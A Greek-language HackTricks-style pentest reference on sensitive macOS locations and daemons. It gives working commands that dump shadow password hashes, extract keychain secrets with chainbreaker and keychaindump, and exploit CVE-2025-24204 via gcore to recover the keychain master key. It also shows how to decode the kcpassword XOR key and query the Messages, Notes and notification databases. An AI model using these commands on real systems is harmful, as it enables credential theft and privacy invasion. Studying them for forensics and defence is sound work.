# macOS Ευαίσθητες Τοποθεσίες & Ενδιαφέροντα Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Κωδικοί πρόσβασης

### Shadow Passwords

Το shadow password αποθηκεύεται μαζί με τη διαμόρφωση του χρήστη σε plists που βρίσκονται στο **`/var/db/dslocal/nodes/Default/users/`**.\
Το ακόλουθο oneliner μπορεί να χρησιμοποιηθεί για να εξάγει **όλες τις πληροφορίες για τους χρήστες** (συμπεριλαμβανομένων των hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Σκριπτάκια σαν αυτό**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ή [**αυτό**](https://github.com/octomagon/davegrohl.git) μπορούν να χρησιμοποιηθούν για να μετατρέψουν το hash σε **hashcat** **format**.

Μια εναλλακτική one-liner η οποία θα εξάγει τα creds όλων των non-service accounts σε hashcat format `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Ένας άλλος τρόπος για να αποκτήσετε το `ShadowHashData` ενός χρήστη είναι χρησιμοποιώντας το `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Αυτό το αρχείο **χρησιμοποιείται μόνο** όταν το σύστημα τρέχει σε **λειτουργία μονού χρήστη** (οπότε όχι πολύ συχνά).

### Keychain Dump

Σημειώστε ότι όταν χρησιμοποιείτε το security binary για να **εξάγετε τους κωδικούς σε αποκρυπτογραφημένη μορφή**, διάφορα μηνύματα θα ζητήσουν από τον χρήστη να επιτρέψει αυτή την ενέργεια.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Βάσει αυτού του σχολίου [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) φαίνεται πως αυτά τα εργαλεία δεν λειτουργούν πλέον σε Big Sur.

### Keychaindump Επισκόπηση

Ένα εργαλείο με όνομα **keychaindump** έχει αναπτυχθεί για την εξαγωγή κωδικών από τα macOS keychains, αλλά αντιμετωπίζει περιορισμούς σε νεότερες εκδόσεις macOS όπως το Big Sur, όπως υποδεικνύεται σε μια [συζήτηση](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Η χρήση του **keychaindump** απαιτεί ο επιτιθέμενος να αποκτήσει πρόσβαση και να κλιμακώσει τα προνόμια σε **root**. Το εργαλείο εκμεταλλεύεται το γεγονός ότι το keychain ξεκλειδώνεται από προεπιλογή κατά τη σύνδεση του χρήστη για λόγους ευκολίας, επιτρέποντας στις εφαρμογές να έχουν πρόσβαση σε αυτό χωρίς να απαιτείται επανειλημμένα ο κωδικός του χρήστη. Ωστόσο, εάν ο χρήστης επιλέξει να κλειδώνει το keychain του μετά από κάθε χρήση, το **keychaindump** καθίσταται αναποτελεσματικό.

Το **Keychaindump** λειτουργεί στοχεύοντας μια συγκεκριμένη διεργασία που ονομάζεται **securityd**, την οποία η Apple περιγράφει ως daemon για authorization και cryptographic operations, κρίσιμη για την πρόσβαση στο keychain. Η διαδικασία εξαγωγής περιλαμβάνει την ταυτοποίηση ενός **Master Key** που προέρχεται από τον κωδικό σύνδεσης του χρήστη. Αυτό το κλειδί είναι απαραίτητο για την ανάγνωση του αρχείου keychain. Για να εντοπίσει το **Master Key**, το **keychaindump** σαρώνει το memory heap του **securityd** χρησιμοποιώντας την εντολή `vmmap`, αναζητώντας πιθανά κλειδιά σε περιοχές που έχουν σημειωθεί ως `MALLOC_TINY`. Η ακόλουθη εντολή χρησιμοποιείται για την επιθεώρηση αυτών των περιοχών μνήμης:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Μετά τον εντοπισμό πιθανών master keys, το **keychaindump** αναζητά στα heaps ένα συγκεκριμένο μοτίβο (`0x0000000000000018`) που υποδεικνύει έναν υποψήφιο master key. Απαιτούνται περαιτέρω βήματα, συμπεριλαμβανομένης της deobfuscation, για τη χρήση αυτού του κλειδιού, όπως περιγράφεται στον πηγαίο κώδικα του **keychaindump**. Οι αναλυτές που εστιάζουν σε αυτόν τον τομέα πρέπει να σημειώσουν ότι τα κρίσιμα δεδομένα για την αποκρυπτογράφηση του keychain αποθηκεύονται στη μνήμη της διεργασίας **securityd**. Ένα παράδειγμα εντολής για την εκτέλεση του **keychaindump** είναι:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) μπορεί να χρησιμοποιηθεί για να εξαγάγει τους ακόλουθους τύπους πληροφοριών από ένα OSX keychain με εγκληματολογικά έγκυρο τρόπο:

- Κατακερματισμένος κωδικός Keychain, κατάλληλος για cracking με [hashcat](https://hashcat.net/hashcat/) ή [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Εφόσον είναι διαθέσιμος ο κωδικός ξεκλειδώματος του keychain, ένα master key που έχει ληφθεί χρησιμοποιώντας [volafox](https://github.com/n0fate/volafox) ή [volatility](https://github.com/volatilityfoundation/volatility), ή ένα αρχείο ξεκλειδώματος όπως το SystemKey, το Chainbreaker θα παρέχει επίσης τους κωδικούς σε απλό κείμενο.

Χωρίς κάποια από αυτές τις μεθόδους ξεκλειδώματος του Keychain, το Chainbreaker θα εμφανίσει όλες τις υπόλοιπες διαθέσιμες πληροφορίες.

#### **Εξαγωγή κλειδιών Keychain**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Εξαγωγή κλειδιών keychain (με κωδικούς) με SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Εξαγωγή keychain keys (με passwords) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Εξαγωγή keychain keys (με passwords) με memory dump**

[Ακολουθήστε αυτά τα βήματα](../index.html#dumping-memory-with-osxpmem) για να εκτελέσετε ένα **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Εξαγωγή κλειδιών του keychain (με κωδικούς) χρησιμοποιώντας τον κωδικό του χρήστη**

Αν γνωρίζετε τον κωδικό του χρήστη, μπορείτε να τον χρησιμοποιήσετε για να **εξάγετε και να αποκρυπτογραφήσετε keychains που ανήκουν στον χρήστη**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Κύριο κλειδί του Keychain μέσω της ένδειξης `gcore` (CVE-2025-24204)

Το macOS 15.0 (Sequoia) περιείχε το `/usr/bin/gcore` με το **`com.apple.system-task-ports.read`** entitlement, επομένως οποιοσδήποτε τοπικός admin (ή κακόβουλη υπογεγραμμένη εφαρμογή) μπορούσε να dump-άρει τη μνήμη οποιασδήποτε διεργασίας ακόμη και με το SIP/TCC enforced. Dumping του `securityd` leaks το **Keychain master key** σε καθαρή μορφή και σας επιτρέπει να αποκρυπτογραφήσετε το `login.keychain-db` χωρίς τον κωδικό χρήστη.

**Γρήγορη αναπαραγωγή σε ευάλωτα builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Δώστε το εξαγόμενο hex κλειδί στο Chainbreaker (`--key <hex>`) για να αποκρυπτογραφήσετε το login keychain. Η Apple αφαίρεσε το entitlement στο **macOS 15.3+**, οπότε αυτό λειτουργεί μόνο σε μη ενημερωμένα Sequoia builds ή σε συστήματα που διατήρησαν το ευάλωτο binary.

### kcpassword

Το **kcpassword** αρχείο περιέχει τον **κωδικό σύνδεσης του χρήστη**, αλλά μόνο εάν ο ιδιοκτήτης του συστήματος έχει **ενεργοποιήσει την αυτόματη σύνδεση**. Επομένως, ο χρήστης θα συνδεθεί αυτόματα χωρίς να του ζητηθεί κωδικός (κάτι που δεν είναι πολύ ασφαλές).

Ο κωδικός αποθηκεύεται στο αρχείο **`/etc/kcpassword`** σε xor με το κλειδί **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
Αυτό καθιστά τον κωδικό αρκετά εύκολο να ανακτηθεί, για παράδειγμα χρησιμοποιώντας scripts όπως [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Ενδιαφέρουσες πληροφορίες σε βάσεις δεδομένων

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Ειδοποιήσεις

Μπορείτε να βρείτε τα δεδομένα των Ειδοποιήσεων στο `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Το μεγαλύτερο μέρος των ενδιαφερόντων πληροφοριών θα βρίσκεται στο **blob**. Οπότε θα χρειαστεί να **εξαγάγετε** αυτό το περιεχόμενο και να το **μετατρέψετε** σε **ανθρώπινο** **αναγνώσιμο** ή να χρησιμοποιήσετε **`strings`**. Για να αποκτήσετε πρόσβαση μπορείτε να κάνετε:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### Πρόσφατα ζητήματα απορρήτου (NotificationCenter DB)

- Σε macOS **14.7–15.1** η Apple αποθήκευε το περιεχόμενο των banners στο `db2/db` SQLite χωρίς κατάλληλη απόκρυψη. CVEs **CVE-2024-44292/44293/40838/54504** επέτρεπαν σε οποιονδήποτε τοπικό χρήστη να διαβάσει το κείμενο των ειδοποιήσεων άλλων χρηστών απλά ανοίγοντας τη DB (no TCC prompt). Διορθώθηκε στην **15.2** με μετακίνηση/κλείδωμα της DB· σε παλαιότερα συστήματα το παραπάνω path still leaks πρόσφατες ειδοποιήσεις και συνημμένα.
- Η βάση δεδομένων είναι world-readable μόνο στις επηρεαζόμενες builds, οπότε όταν κάνετε hunting σε legacy endpoints copy την πριν το updating για να διατηρήσετε τα artefacts.

### Notes

Οι **notes** των χρηστών μπορούν να βρεθούν στο `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Προτιμήσεις

Στις εφαρμογές macOS οι προτιμήσεις βρίσκονται στο **`$HOME/Library/Preferences`** και στο iOS βρίσκονται στο `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Στο macOS το cli εργαλείο **`defaults`** μπορεί να χρησιμοποιηθεί για να **τροποποιήσει το αρχείο προτιμήσεων**.

**`/usr/sbin/cfprefsd`** διεκδικεί τις XPC υπηρεσίες `com.apple.cfprefsd.daemon` και `com.apple.cfprefsd.agent` και μπορεί να κληθεί για να εκτελέσει ενέργειες όπως η τροποποίηση προτιμήσεων.

## OpenDirectory permissions.plist

Το αρχείο `/System/Library/OpenDirectory/permissions.plist` περιέχει δικαιώματα που εφαρμόζονται σε χαρακτηριστικά κόμβου και προστατεύεται από SIP.\
Αυτό το αρχείο παραχωρεί δικαιώματα σε συγκεκριμένους χρήστες ανά UUID (και όχι uid) ώστε να μπορούν να έχουν πρόσβαση σε συγκεκριμένες ευαίσθητες πληροφορίες όπως `ShadowHashData`, `HeimdalSRPKey` και `KerberosKeys` μεταξύ άλλων:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Ειδοποιήσεις συστήματος

### Ειδοποιήσεις Darwin

Ο κύριος daemon για τις ειδοποιήσεις είναι **`/usr/sbin/notifyd`**. Για να λαμβάνουν ειδοποιήσεις, οι clients πρέπει να εγγραφούν μέσω του Mach port `com.apple.system.notification_center` (ελέγξτε τους με `sudo lsmp -p <pid notifyd>`). Ο daemon μπορεί να ρυθμιστεί με το αρχείο `/etc/notify.conf`.

Τα ονόματα που χρησιμοποιούνται για τις ειδοποιήσεις είναι μοναδικές σημάνσεις reverse DNS και όταν αποστέλλεται μια ειδοποίηση σε ένα από αυτά, οι client(s) που έχουν δηλώσει ότι μπορούν να το χειριστούν θα τη λάβουν.

Είναι δυνατό να κάνετε dump της τρέχουσας κατάστασης (και να δείτε όλα τα ονόματα) στέλνοντας το σήμα SIGUSR2 στη διεργασία notifyd και διαβάζοντας το παραγόμενο αρχείο: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Διανεμημένο Κέντρο Ειδοποιήσεων

Το **Διανεμημένο Κέντρο Ειδοποιήσεων** του οποίου το κύριο binary είναι **`/usr/sbin/distnoted`**, είναι ένας άλλος τρόπος αποστολής ειδοποιήσεων. Εκθέτει ορισμένες XPC υπηρεσίες και εκτελεί κάποιους ελέγχους για να προσπαθήσει να επαληθεύσει τους πελάτες.

### Apple Push Notifications (APN)

Σε αυτήν την περίπτωση, οι εφαρμογές μπορούν να εγγραφούν σε **topics**. Ο client θα δημιουργήσει ένα token επικοινωνώντας με τους servers της Apple μέσω του **`apsd`**.\
Στη συνέχεια, οι providers θα έχουν επίσης δημιουργήσει ένα token και θα μπορούν να συνδεθούν με τους servers της Apple για να στείλουν μηνύματα στους clients. Αυτά τα μηνύματα θα λαμβάνονται τοπικά από **`apsd`** το οποίο θα προωθεί την ειδοποίηση στην εφαρμογή που την περιμένει.

Οι ρυθμίσεις βρίσκονται στο `/Library/Preferences/com.apple.apsd.plist`.

Υπάρχει μια τοπική βάση δεδομένων μηνυμάτων στο macOS στο `/Library/Application\ Support/ApplePushService/aps.db` και στο iOS στο `/var/mobile/Library/ApplePushService`. Έχει 3 πίνακες: `incoming_messages`, `outgoing_messages` και `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Είναι επίσης δυνατό να λάβετε πληροφορίες για το daemon και τις συνδέσεις χρησιμοποιώντας:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Ειδοποιήσεις Χρήστη

Αυτές είναι οι ειδοποιήσεις που πρέπει να εμφανίζονται στην οθόνη του χρήστη:

- **`CFUserNotification`**: Αυτό το API παρέχει έναν τρόπο εμφάνισης στην οθόνη ενός αναδυόμενου παραθύρου με μήνυμα.
- **The Bulletin Board**: Αυτό εμφανίζεται σε iOS ως banner που εξαφανίζεται και θα αποθηκευτεί στο Notification Center.
- **`NSUserNotificationCenter`**: Αυτό είναι το iOS bulletin board στο MacOS. Η βάση δεδομένων με τις ειδοποιήσεις βρίσκεται στο `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## References

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
